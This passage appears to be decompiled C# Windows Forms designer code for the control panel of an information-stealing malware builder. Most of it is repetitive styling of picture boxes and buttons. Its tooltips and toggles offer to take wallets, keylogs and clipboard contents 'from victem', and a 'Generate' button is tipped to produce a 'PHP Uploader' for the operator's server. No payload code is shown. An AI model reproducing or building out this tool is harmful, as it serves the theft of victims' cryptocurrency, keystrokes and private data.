            this.rjCircularPictureBox20.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox20.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox20.BorderSize = 2;
            this.rjCircularPictureBox20.GradientAngle = 50f;
            this.rjCircularPictureBox20.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox20.Image");
            this.rjCircularPictureBox20.Location = new System.Drawing.Point(208, 321);
            this.rjCircularPictureBox20.Name = "rjCircularPictureBox20";
            this.rjCircularPictureBox20.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox20.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox20.TabIndex = 231;
            this.rjCircularPictureBox20.TabStop = false;
            this.rjCircularPictureBox21.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox21.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox21.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox21.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox21.BorderSize = 2;
            this.rjCircularPictureBox21.GradientAngle = 50f;
            this.rjCircularPictureBox21.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox21.Image");
            this.rjCircularPictureBox21.Location = new System.Drawing.Point(743, 385);
            this.rjCircularPictureBox21.Name = "rjCircularPictureBox21";
            this.rjCircularPictureBox21.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox21.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox21.TabIndex = 232;
            this.rjCircularPictureBox21.TabStop = false;
            this.rjCircularPictureBox22.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox22.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox22.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox22.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox22.BorderSize = 2;
            this.rjCircularPictureBox22.GradientAngle = 50f;
            this.rjCircularPictureBox22.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox22.Image");
            this.rjCircularPictureBox22.Location = new System.Drawing.Point(913, 385);
            this.rjCircularPictureBox22.Name = "rjCircularPictureBox22";
            this.rjCircularPictureBox22.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox22.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox22.TabIndex = 233;
            this.rjCircularPictureBox22.TabStop = false;
            this.rjCircularPictureBox23.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox23.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox23.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox23.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox23.BorderSize = 2;
            this.rjCircularPictureBox23.GradientAngle = 50f;
            this.rjCircularPictureBox23.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox23.Image");
            this.rjCircularPictureBox23.Location = new System.Drawing.Point(570, 258);
            this.rjCircularPictureBox23.Name = "rjCircularPictureBox23";
            this.rjCircularPictureBox23.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox23.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox23.TabIndex = 234;
            this.rjCircularPictureBox23.TabStop = false;
            this.rjCircularPictureBox24.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox24.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox24.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox24.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox24.BorderSize = 2;
            this.rjCircularPictureBox24.GradientAngle = 50f;
            this.rjCircularPictureBox24.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox24.Image");
            this.rjCircularPictureBox24.Location = new System.Drawing.Point(208, 447);
            this.rjCircularPictureBox24.Name = "rjCircularPictureBox24";
            this.rjCircularPictureBox24.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox24.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.rjCircularPictureBox24.TabIndex = 235;
            this.rjCircularPictureBox24.TabStop = false;
            this.rjCircularPictureBox25.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox25.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox25.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox25.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox25.BorderSize = 2;
            this.rjCircularPictureBox25.GradientAngle = 50f;
            this.rjCircularPictureBox25.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox25.Image");
            this.rjCircularPictureBox25.Location = new System.Drawing.Point(913, 321);
            this.rjCircularPictureBox25.Name = "rjCircularPictureBox25";
            this.rjCircularPictureBox25.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox25.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox25.TabIndex = 237;
            this.rjCircularPictureBox25.TabStop = false;
            this.rjCircularPictureBox26.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox26.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox26.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox26.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox26.BorderSize = 2;
            this.rjCircularPictureBox26.GradientAngle = 50f;
            this.rjCircularPictureBox26.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox26.Image");
            this.rjCircularPictureBox26.Location = new System.Drawing.Point(398, 48);
            this.rjCircularPictureBox26.Name = "rjCircularPictureBox26";
            this.rjCircularPictureBox26.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox26.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox26.TabIndex = 238;
            this.rjCircularPictureBox26.TabStop = false;
            this.rjCircularPictureBox27.BackColor = System.Drawing.Color.Black;
            this.rjCircularPictureBox27.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox27.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox27.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox27.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox27.BorderSize = 2;
            this.rjCircularPictureBox27.GradientAngle = 50f;
            this.rjCircularPictureBox27.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox27.Image");
            this.rjCircularPictureBox27.Location = new System.Drawing.Point(400, 385);
            this.rjCircularPictureBox27.Name = "rjCircularPictureBox27";
            this.rjCircularPictureBox27.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox27.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox27.TabIndex = 239;
            this.rjCircularPictureBox27.TabStop = false;
            this.rjCircularPictureBox28.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox28.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox28.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox28.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox28.BorderSize = 2;
            this.rjCircularPictureBox28.GradientAngle = 50f;
            this.rjCircularPictureBox28.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox28.Image");
            this.rjCircularPictureBox28.Location = new System.Drawing.Point(570, 385);
            this.rjCircularPictureBox28.Name = "rjCircularPictureBox28";
            this.rjCircularPictureBox28.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox28.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox28.TabIndex = 240;
            this.rjCircularPictureBox28.TabStop = false;
            this.rjCircularPictureBox29.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox29.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox29.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox29.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox29.BorderSize = 2;
            this.rjCircularPictureBox29.GradientAngle = 50f;
            this.rjCircularPictureBox29.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox29.Image");
            this.rjCircularPictureBox29.Location = new System.Drawing.Point(743, 258);
            this.rjCircularPictureBox29.Name = "rjCircularPictureBox29";
            this.rjCircularPictureBox29.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox29.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox29.TabIndex = 241;
            this.rjCircularPictureBox29.TabStop = false;
            this.rjCircularPictureBox30.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox30.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox30.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox30.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox30.BorderSize = 2;
            this.rjCircularPictureBox30.GradientAngle = 50f;
            this.rjCircularPictureBox30.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox30.Image");
            this.rjCircularPictureBox30.Location = new System.Drawing.Point(743, 321);
            this.rjCircularPictureBox30.Name = "rjCircularPictureBox30";
            this.rjCircularPictureBox30.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox30.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox30.TabIndex = 242;
            this.rjCircularPictureBox30.TabStop = false;
            this.rjCircularPictureBox31.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox31.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox31.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox31.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox31.BorderSize = 2;
            this.rjCircularPictureBox31.GradientAngle = 50f;
            this.rjCircularPictureBox31.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox31.Image");
            this.rjCircularPictureBox31.Location = new System.Drawing.Point(743, 447);
            this.rjCircularPictureBox31.Name = "rjCircularPictureBox31";
            this.rjCircularPictureBox31.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox31.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox31.TabIndex = 243;
            this.rjCircularPictureBox31.TabStop = false;
            this.studioButton14.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.studioButton14.BackColor = System.Drawing.Color.Transparent;
            bloom.Name = "DownGradient1";
            bloom.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom2.Name = "DownGradient2";
            bloom2.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom3.Name = "NoneGradient1";
            bloom3.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom4.Name = "NoneGradient2";
            bloom4.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom5.Name = "Shine1";
            bloom5.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom6.Name = "Shine2A";
            bloom6.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom7.Name = "Shine2B";
            bloom7.Value = System.Drawing.Color.Transparent;
            bloom8.Name = "Shine3";
            bloom8.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
            bloom9.Name = "TextShade";
            bloom9.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
            bloom10.Name = "Text";
            bloom10.Value = System.Drawing.Color.White;
            bloom11.Name = "Glow";
            bloom11.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
            bloom12.Name = "Border";
            bloom12.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            bloom13.Name = "Corners";
            bloom13.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            this.studioButton14.Colors = new Bloom[13]
            {
                bloom, bloom2, bloom3, bloom4, bloom5, bloom6, bloom7, bloom8, bloom9, bloom10,
                bloom11, bloom12, bloom13
            };
            this.studioButton14.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton14.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.studioButton14.Image = null;
            this.studioButton14.Location = new System.Drawing.Point(8, 343);
            this.studioButton14.Name = "studioButton14";
            this.studioButton14.NoRounding = false;
            this.studioButton14.Size = new System.Drawing.Size(94, 25);
            this.studioButton14.TabIndex = 102;
            this.studioButton14.Text = "Generate";
            this.toolTip1.SetToolTip(this.studioButton14, "Generate PHP Uploader to upload on your server!");
            this.studioButton14.Transparent = true;
            this.studioButton14.Click += new System.EventHandler(studioButton14_Click);
            this.chkWallets.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            this.chkWallets.BackColor = System.Drawing.Color.Transparent;
            this.chkWallets.Location = new System.Drawing.Point(30, 490);
            this.chkWallets.Name = "chkWallets";
            this.chkWallets.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.chkWallets.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.chkWallets.Size = new System.Drawing.Size(50, 19);
            this.chkWallets.Style = JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkWallets.TabIndex = 101;
            this.toolTip1.SetToolTip(this.chkWallets, "Get Wallets from victem!");
            this.chkWallets.Visible = false;
            this.chkInfo.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            this.chkInfo.BackColor = System.Drawing.Color.Transparent;
            this.chkInfo.Location = new System.Drawing.Point(30, 550);
            this.chkInfo.Name = "chkInfo";
            this.chkInfo.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.chkInfo.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.chkInfo.Size = new System.Drawing.Size(50, 19);
            this.chkInfo.Style = JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkInfo.TabIndex = 98;
            this.toolTip1.SetToolTip(this.chkInfo, "Get Keylogs from victem!");
            this.chkInfo.CheckedChanged += new JCS.ToggleSwitch.CheckedChangedDelegate(chkInfo_CheckedChanged);
            this.chkKeylog.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            this.chkKeylog.BackColor = System.Drawing.Color.Transparent;
            this.chkKeylog.Location = new System.Drawing.Point(30, 589);
            this.chkKeylog.Name = "chkKeylog";
            this.chkKeylog.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.chkKeylog.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.chkKeylog.Size = new System.Drawing.Size(50, 19);
            this.chkKeylog.Style = JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkKeylog.TabIndex = 93;
            this.toolTip1.SetToolTip(this.chkKeylog, "Get Keylogs from victem!");
            this.chkKeylog.CheckedChanged += new JCS.ToggleSwitch.CheckedChangedDelegate(chkKeylog_CheckedChanged);
            this.chkClip.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            this.chkClip.BackColor = System.Drawing.Color.Transparent;
            this.chkClip.Location = new System.Drawing.Point(30, 628);
            this.chkClip.Name = "chkClip";
            this.chkClip.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.chkClip.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.chkClip.Size = new System.Drawing.Size(50, 19);
            this.chkClip.Style = JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkClip.TabIndex = 96;
            this.toolTip1.SetToolTip(this.chkClip, "Get Clipboard for victem!");
            this.chkClip.CheckedChanged += new JCS.ToggleSwitch.CheckedChangedDelegate(chkClip_CheckedChanged);
            this.studioButton7.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.studioButton7.BackColor = System.Drawing.Color.Transparent;
            bloom14.Name = "DownGradient1";
            bloom14.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom15.Name = "DownGradient2";
            bloom15.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom16.Name = "NoneGradient1";
            bloom16.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom17.Name = "NoneGradient2";
            bloom17.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom18.Name = "Shine1";
            bloom18.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom19.Name = "Shine2A";
            bloom19.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom20.Name = "Shine2B";
            bloom20.Value = System.Drawing.Color.FromArgb(0, 255, 255, 255);
            bloom21.Name = "Shine3";
            bloom21.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
            bloom22.Name = "TextShade";
            bloom22.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
            bloom23.Name = "Text";
            bloom23.Value = System.Drawing.Color.FromArgb(255, 255, 255);
            bloom24.Name = "Glow";
            bloom24.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
            bloom25.Name = "Border";
            bloom25.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            bloom26.Name = "Corners";
            bloom26.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            this.studioButton7.Colors = new Bloom[13]
            {
                bloom14, bloom15, bloom16, bloom17, bloom18, bloom19, bloom20, bloom21, bloom22, bloom23,
                bloom24, bloom25, bloom26
            };
            this.studioButton7.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton7.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.studioButton7.Image = null;
            this.studioButton7.Location = new System.Drawing.Point(8, 79);
            this.studioButton7.Name = "studioButton7";
            this.studioButton7.NoRounding = false;
            this.studioButton7.Size = new System.Drawing.Size(94, 25);
            this.studioButton7.TabIndex = 76;
            this.studioButton7.Text = "Browsers";
            this.toolTip1.SetToolTip(this.studioButton7, "      All fuctions");
            this.studioButton7.Transparent = true;
            this.studioButton7.Click += new System.EventHandler(studioButton7_Click);
            this.studioButton9.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.studioButton9.BackColor = System.Drawing.Color.Transparent;
            bloom27.Name = "DownGradient1";
            bloom27.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom28.Name = "DownGradient2";
            bloom28.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom29.Name = "NoneGradient1";
            bloom29.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom30.Name = "NoneGradient2";
            bloom30.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom31.Name = "Shine1";
            bloom31.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom32.Name = "Shine2A";
            bloom32.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom33.Name = "Shine2B";
            bloom33.Value = System.Drawing.Color.Transparent;
            bloom34.Name = "Shine3";
            bloom34.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
            bloom35.Name = "TextShade";
            bloom35.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
            bloom36.Name = "Text";
            bloom36.Value = System.Drawing.Color.White;
            bloom37.Name = "Glow";
            bloom37.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
            bloom38.Name = "Border";
            bloom38.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            bloom39.Name = "Corners";
            bloom39.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            this.studioButton9.Colors = new Bloom[13]
            {
                bloom27, bloom28, bloom29, bloom30, bloom31, bloom32, bloom33, bloom34, bloom35, bloom36,
                bloom37, bloom38, bloom39
            };
            this.studioButton9.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton9.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.studioButton9.Image = null;
            this.studioButton9.Location = new System.Drawing.Point(8, 112);
            this.studioButton9.Name = "studioButton9";
            this.studioButton9.NoRounding = false;
            this.studioButton9.Size = new System.Drawing.Size(94, 25);
            this.studioButton9.TabIndex = 79;
            this.studioButton9.Text = "System";
            this.toolTip1.SetToolTip(this.studioButton9, "      All fuctions");
            this.studioButton9.Transparent = true;
            this.studioButton9.Click += new System.EventHandler(studioButton9_Click);
            this.studioButton11.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.studioButton11.BackColor = System.Drawing.Color.Transparent;
            bloom40.Name = "DownGradient1";
            bloom40.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom41.Name = "DownGradient2";
            bloom41.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom42.Name = "NoneGradient1";
            bloom42.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom43.Name = "NoneGradient2";
            bloom43.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom44.Name = "Shine1";
            bloom44.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom45.Name = "Shine2A";
            bloom45.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom46.Name = "Shine2B";
            bloom46.Value = System.Drawing.Color.Transparent;
            bloom47.Name = "Shine3";
            bloom47.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
            bloom48.Name = "TextShade";
            bloom48.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
            bloom49.Name = "Text";
            bloom49.Value = System.Drawing.Color.White;
            bloom50.Name = "Glow";
            bloom50.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
            bloom51.Name = "Border";
            bloom51.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            bloom52.Name = "Corners";
            bloom52.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            this.studioButton11.Colors = new Bloom[13]
            {
                bloom40, bloom41, bloom42, bloom43, bloom44, bloom45, bloom46, bloom47, bloom48, bloom49,
                bloom50, bloom51, bloom52
            };
            this.studioButton11.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton11.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.studioButton11.Image = null;
            this.studioButton11.Location = new System.Drawing.Point(8, 277);
            this.studioButton11.Name = "studioButton11";
            this.studioButton11.NoRounding = false;
            this.studioButton11.Size = new System.Drawing.Size(94, 25);
            this.studioButton11.TabIndex = 83;
            this.studioButton11.Text = "Rescale";
            this.studioButton11.Transparent = true;
            this.studioButton11.Click += new System.EventHandler(studioButton11_Click);
            this.studioButton10.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.studioButton10.BackColor = System.Drawing.Color.Transparent;
            bloom53.Name = "DownGradient1";
            bloom53.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom54.Name = "DownGradient2";
            bloom54.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom55.Name = "NoneGradient1";
            bloom55.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom56.Name = "NoneGradient2";
            bloom56.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom57.Name = "Shine1";
            bloom57.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom58.Name = "Shine2A";
            bloom58.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom59.Name = "Shine2B";
            bloom59.Value = System.Drawing.Color.Transparent;
            bloom60.Name = "Shine3";
            bloom60.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
            bloom61.Name = "TextShade";
            bloom61.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
            bloom62.Name = "Text";
            bloom62.Value = System.Drawing.Color.White;
            bloom63.Name = "Glow";
            bloom63.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
            bloom64.Name = "Border";
            bloom64.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            bloom65.Name = "Corners";
            bloom65.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            this.studioButton10.Colors = new Bloom[13]
            {
                bloom53, bloom54, bloom55, bloom56, bloom57, bloom58, bloom59, bloom60, bloom61, bloom62,
                bloom63, bloom64, bloom65
            };
            this.studioButton10.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton10.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.studioButton10.Image = null;
            this.studioButton10.Location = new System.Drawing.Point(8, 145);
            this.studioButton10.Name = "studioButton10";
            this.studioButton10.NoRounding = false;
            this.studioButton10.Size = new System.Drawing.Size(94, 25);
            this.studioButton10.TabIndex = 82;
            this.studioButton10.Text = "Recovery";
            this.studioButton10.Transparent = true;
            this.studioButton10.Click += new System.EventHandler(studioButton10_Click);
            this.studioButton8.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.studioButton8.BackColor = System.Drawing.Color.Transparent;
            bloom66.Name = "DownGradient1";
            bloom66.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom67.Name = "DownGradient2";
            bloom67.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom68.Name = "NoneGradient1";
            bloom68.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom69.Name = "NoneGradient2";
            bloom69.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom70.Name = "Shine1";
            bloom70.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom71.Name = "Shine2A";
            bloom71.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom72.Name = "Shine2B";
            bloom72.Value = System.Drawing.Color.Transparent;
            bloom73.Name = "Shine3";
            bloom73.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
            bloom74.Name = "TextShade";
            bloom74.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
            bloom75.Name = "Text";
            bloom75.Value = System.Drawing.Color.White;
            bloom76.Name = "Glow";
            bloom76.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
            bloom77.Name = "Border";
            bloom77.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            bloom78.Name = "Corners";
            bloom78.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            this.studioButton8.Colors = new Bloom[13]
            {
                bloom66, bloom67, bloom68, bloom69, bloom70, bloom71, bloom72, bloom73, bloom74, bloom75,
                bloom76, bloom77, bloom78
            };
            this.studioButton8.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton8.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.studioButton8.Image = null;
            this.studioButton8.Location = new System.Drawing.Point(8, 310);
            this.studioButton8.Name = "studioButton8";
            this.studioButton8.NoRounding = false;
            this.studioButton8.Size = new System.Drawing.Size(94, 25);
            this.studioButton8.TabIndex = 81;
            this.studioButton8.Text = "Help";
            this.studioButton8.Transparent = true;
            this.studioButton8.Click += new System.EventHandler(studioButton8_Click_1);
            this.studioButton1.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.studioButton1.BackColor = System.Drawing.Color.Transparent;
            bloom79.Name = "DownGradient1";
            bloom79.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom80.Name = "DownGradient2";
            bloom80.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom81.Name = "NoneGradient1";
            bloom81.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom82.Name = "NoneGradient2";
            bloom82.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom83.Name = "Shine1";
